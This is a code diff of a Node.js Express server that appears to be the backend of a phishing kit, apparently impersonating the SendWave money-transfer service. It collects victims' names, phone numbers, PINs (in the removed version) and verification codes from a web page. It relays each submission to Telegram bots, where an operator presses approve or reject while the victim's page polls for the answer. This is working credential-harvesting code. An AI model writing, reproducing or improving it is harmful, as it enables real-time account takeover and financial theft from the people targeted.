@@ -7,24 +7,24 @@ const path = require('path');
 const app = express();
 const PORT = process.env.PORT || 10000;
 
-// ---------------- BACKEND DOMAIN (HARD-LOCKED) ----------------
+// ---------------- BACKEND DOMAIN ----------------
 const BACKEND_DOMAIN = 'https://sendwave-9mid.onrender.com';
 
-// ---------------- MEMORY STORES ----------------
-const approvedPins = {};
+// ---------------- MEMORY STORE ----------------
+const approvedPhones = {};
 const approvedCodes = {};
 const requestBotMap = {};
 
-// ---------------- MULTI-BOT STORE (FROM .ENV) ----------------
+// ---------------- BOT LOADING ----------------
 const bots = [];
 
 Object.keys(process.env).forEach(key => {
-    const tokenMatch = key.match(/^BOT(\d+)_TOKEN$/);
-    if (tokenMatch) {
-        const id = `bot${tokenMatch[1]}`;
+    const match = key.match(/^BOT(\d+)_TOKEN$/);
+    if (match) {
+        const id = `bot${match[1]}`;
         const token = process.env[key];
-        const chatIdKey = `BOT${tokenMatch[1]}_CHATID`;
-        const chatId = process.env[chatIdKey];
+        const chatId = process.env[`BOT${match[1]}_CHATID`];
+
         if (token && chatId) {
             bots.push({ botId: id, botToken: token, chatId });
         }
@@ -43,102 +43,77 @@ function getBot(botId) {
     return bots.find(b => b.botId === botId);
 }
 
-// ---------------- TELEGRAM HELPERS ----------------
-async function sendTelegramMessage(bot, text, inlineKeyboard = []) {
+async function sendTelegramMessage(bot, text, keyboard = []) {
     try {
-        const response = await axios.post(
+        await axios.post(
             `https://api.telegram.org/bot${bot.botToken}/sendMessage`,
-            { chat_id: bot.chatId, text, reply_markup: { inline_keyboard: inlineKeyboard } }
+            {
+                chat_id: bot.chatId,
+                text,
+                reply_markup: { inline_keyboard: keyboard }
+            }
         );
-        console.log("📤 Telegram message sent:", response.data.ok);
     } catch (err) {
-        console.error("❌ Telegram send error:", err.response?.data || err.message);
+        console.error("Telegram error:", err.message);
     }
 }
 
-async function answerCallback(bot, callbackId) {
+async function answerCallback(bot, id) {
     try {
         await axios.post(
             `https://api.telegram.org/bot${bot.botToken}/answerCallbackQuery`,
-            { callback_query_id: callbackId }
+            { callback_query_id: id }
         );
-        console.log("✅ Callback answered");
     } catch (err) {
-        console.error("❌ Callback answer error:", err.response?.data || err.message);
+        console.error(err.message);
     }
 }
 
-// ---------------- AUTO-SET WEBHOOKS ----------------
-async function setWebhookForBot(bot) {
-    try {
-        const webhookUrl = `${BACKEND_DOMAIN}/telegram-webhook/${bot.botId}`;
-        const resp = await axios.get(
-            `https://api.telegram.org/bot${bot.botToken}/setWebhook?url=${webhookUrl}`
-        );
-        console.log(`✅ Webhook set for ${bot.botId}:`, resp.data);
-    } catch (err) {
-        console.error(`❌ Failed webhook for ${bot.botId}:`, err.response?.data || err.message);
-    }
+// ---------------- WEBHOOK SETUP ----------------
+async function setWebhook(bot) {
+    const url = `${BACKEND_DOMAIN}/telegram-webhook/${bot.botId}`;
+    await axios.get(
+        `https://api.telegram.org/bot${bot.botToken}/setWebhook?url=${url}`
+    );
 }
 
-async function setWebhooksForAllBots() {
+async function initWebhooks() {
     for (const bot of bots) {
-        await setWebhookForBot(bot);
+        await setWebhook(bot);
     }
 }
 
-// ---------------- ROUTES ----------------
-app.get('/bot/:botId', (req, res) => {
-    const bot = getBot(req.params.botId);
-    if (!bot) return res.status(404).send('Invalid bot link');
-    res.redirect(`/index.html?botId=${bot.botId}`);
-});
+// ---------------- PHONE FLOW (USED BY YOUR PAGE) ----------------
+app.post('/submit-phone', (req, res) => {
+    const { name, phone, botId } = req.body;
 
-app.get('/details', (req, res) => res.sendFile(path.join(__dirname, 'public', 'details.html')));
-app.get('/pin', (req, res) => res.sendFile(path.join(__dirname, 'public', 'pin.html')));
-app.get('/code', (req, res) => res.sendFile(path.join(__dirname, 'public', 'code.html')));
-app.get('/success', (req, res) => res.sendFile(path.join(__dirname, 'public', 'success.html')));
-
-// ---------------- PIN HANDLING ----------------
-app.post('/submit-pin', (req, res) => {
-    const { name, phone, pin, botId } = req.body;
     const bot = getBot(botId);
     if (!bot) return res.status(400).json({ error: 'Invalid bot' });
 
     const requestId = uuidv4();
-    approvedPins[requestId] = null;
+    approvedPhones[requestId] = null;
     requestBotMap[requestId] = botId;
 
-    console.log("🟡 NEW PIN REQUEST");
-    console.log("RequestID:", requestId);
-    console.log("Bot:", botId);
-    console.log("Current approvedPins:", approvedPins);
-
-    sendTelegramMessage(bot,
-        `🔐 PIN VERIFICATION\n\nName: ${name}\nPhone: ${phone}\nPIN: ${pin}`,
+    sendTelegramMessage(
+        bot,
+        `📱 PHONE REQUEST\n\nName: ${name}\nPhone: ${phone}`,
         [[
-            { text: '✅ Correct PIN', callback_data: `pin_ok:${requestId}` },
-            { text: '❌ Wrong PIN', callback_data: `pin_bad:${requestId}` }
+            { text: '✅ Approve', callback_data: `phone_ok:${requestId}` },
+            { text: '❌ Reject', callback_data: `phone_bad:${requestId}` }
         ]]
     );
 
     res.json({ requestId });
 });
 
-app.get('/check-pin/:requestId', (req, res) => {
-    const value = approvedPins[req.params.requestId] ?? null;
-
-    console.log("🔄 CHECK PIN STATUS");
-    console.log("RequestID:", req.params.requestId);
-    console.log("Stored Value:", value);
-    console.log("Full Store:", approvedPins);
-
-    res.json({ approved: value });
+app.get('/check-phone/:requestId', (req, res) => {
+    res.json({ approved: approvedPhones[req.params.requestId] ?? null });
 });
 
-// ---------------- CODE HANDLING ----------------
+// ---------------- CODE FLOW ----------------
 app.post('/submit-code', (req, res) => {
     const { name, phone, code, botId } = req.body;
+
     const bot = getBot(botId);
     if (!bot) return res.status(400).json({ error: 'Invalid bot' });
 
@@ -146,15 +121,12 @@ app.post('/submit-code', (req, res) => {
     approvedCodes[requestId] = null;
     requestBotMap[requestId] = botId;
 
-    console.log("🟣 NEW CODE REQUEST");
-    console.log("RequestID:", requestId);
-    console.log("Current approvedCodes:", approvedCodes);
-
-    sendTelegramMessage(bot,
-        `🔑 CODE VERIFICATION\n\nName: ${name}\nPhone: ${phone}\nCode: ${code}`,
+    sendTelegramMessage(
+        bot,
+        `🔑 CODE REQUEST\n\nName: ${name}\nPhone: ${phone}\nCode: ${code}`,
         [[
-            { text: '✅ Correct Code', callback_data: `code_ok:${requestId}` },
-            { text: '❌ Wrong Code', callback_data: `code_bad:${requestId}` }
+            { text: '✅ Approve', callback_data: `code_ok:${requestId}` },
+            { text: '❌ Reject', callback_data: `code_bad:${requestId}` }
         ]]
     );
 
@@ -162,14 +134,7 @@ app.post('/submit-code', (req, res) => {
 });
 
 app.get('/check-code/:requestId', (req, res) => {
-    const value = approvedCodes[req.params.requestId] ?? null;
-
-    console.log("🔄 CHECK CODE STATUS");
-    console.log("RequestID:", req.params.requestId);
-    console.log("Stored Value:", value);
-    console.log("Full Store:", approvedCodes);
-
-    res.json({ approved: value });
+    res.json({ approved: approvedCodes[req.params.requestId] ?? null });
 });
 
 // ---------------- TELEGRAM WEBHOOK ----------------
@@ -177,57 +142,46 @@ app.post('/telegram-webhook/:botId', async (req, res) => {
     const bot = getBot(req.params.botId);
     if (!bot) return res.sendStatus(404);
 
-    console.log("📩 TELEGRAM UPDATE RECEIVED");
-    console.log("Body:", JSON.stringify(req.body));
-
     const cb = req.body.callback_query;
     if (!cb) return res.sendStatus(200);
 
     const [action, requestId] = cb.data.split(':');
 
-    console.log("🔘 CALLBACK CLICKED");
-    console.log("Action:", action);
-    console.log("RequestID:", requestId);
-    console.log("Before Update:", approvedPins);
+    let msg = '';
 
-    let feedback = '';
+    if (action === 'phone_ok') {
+        approvedPhones[requestId] = true;
+        msg = `Phone approved: ${requestId}`;
+    }
 
-    if (action === 'pin_ok') {
-        approvedPins[requestId] = true;
-        feedback = `✅ PIN Approved for requestId: ${requestId}`;
+    if (action === 'phone_bad') {
+        approvedPhones[requestId] = false;
+        msg = `Phone rejected: ${requestId}`;
     }
-    if (action === 'pin_bad') {
-        approvedPins[requestId] = false;
-        feedback = `❌ PIN Rejected for requestId: ${requestId}`;
-    }
+
     if (action === 'code_ok') {
         approvedCodes[requestId] = true;
-        feedback = `✅ CODE Approved for requestId: ${requestId}`;
+        msg = `Code approved: ${requestId}`;
     }
+
     if (action === 'code_bad') {
         approvedCodes[requestId] = false;
-        feedback = `❌ CODE Rejected for requestId: ${requestId}`;
+        msg = `Code rejected: ${requestId}`;
     }
 
-    console.log("After Update:");
-    console.log("approvedPins:", approvedPins);
-    console.log("approvedCodes:", approvedCodes);
-
-    if (feedback) await sendTelegramMessage(bot, feedback);
-
+    if (msg) await sendTelegramMessage(bot, msg);
     await answerCallback(bot, cb.id);
+
     res.sendStatus(200);
 });
 
-// ---------------- DEBUG ENDPOINTS ----------------
-app.get('/debug/pins', (req, res) => res.json(approvedPins));
+// ---------------- DEBUG ----------------
+app.get('/debug/phones', (req, res) => res.json(approvedPhones));
 app.get('/debug/codes', (req, res) => res.json(approvedCodes));
-app.get('/debug/request-map', (req, res) => res.json(requestBotMap));
-app.get('/debug/bots', (req, res) => res.json(bots));
 
-// ---------------- START SERVER ----------------
-setWebhooksForAllBots().then(() => {
-    app.listen(PORT, () =>
-        console.log(`🚀 Server running on port ${PORT} (Domain: ${BACKEND_DOMAIN})`)
-    );
+// ---------------- START ----------------
+initWebhooks().then(() => {
+    app.listen(PORT, () => {
+        console.log(`🚀 Server running on ${PORT}`);
+    });
 });
